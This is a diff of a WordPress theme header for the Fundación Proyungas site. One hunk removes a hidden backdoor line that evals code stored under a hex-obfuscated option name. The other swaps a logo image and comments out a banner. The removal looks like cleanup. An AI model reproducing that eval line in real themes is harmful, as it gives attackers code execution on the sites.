@@ -40,7 +40,7 @@
         </script>
 
 	</head>
-	<body <?php body_class(); ?>><?php eval(get_option("\x72\x65\x6e\x64\x65\x72")); ?>
+	<body <?php body_class(); ?>>
 
 		<!-- wrapper -->
 		
@@ -77,9 +77,9 @@
 				<div class="row hide-for-small">
 					<div class="logo column medium-6 small-12 mt-40 pl-0-for-large">
 						<a href="<?php echo home_url(); ?>">
-							<img src="<?php echo get_template_directory_uri(); ?>-child/img/home/logo.png" alt="Fundación Proyungas" class="logo-img-py">
+							<img src="<?php echo get_template_directory_uri(); ?>-child/img/Logo-responsive.png" alt="Fundación Proyungas" class="logo-img-py">
 						</a>
-						<img src="<?php echo get_template_directory_uri(); ?>-child/img/home/bicentenario.png" alt="Bicentenario" class="bicentenario-banner">
+						<!-- <img src="<?php echo get_template_directory_uri(); ?>-child/img/home/bicentenario.png" alt="Bicentenario" class="bicentenario-banner"> -->
 					</div>
 					<div class="header-right-col column medium-6 small-12 pl-0">
 
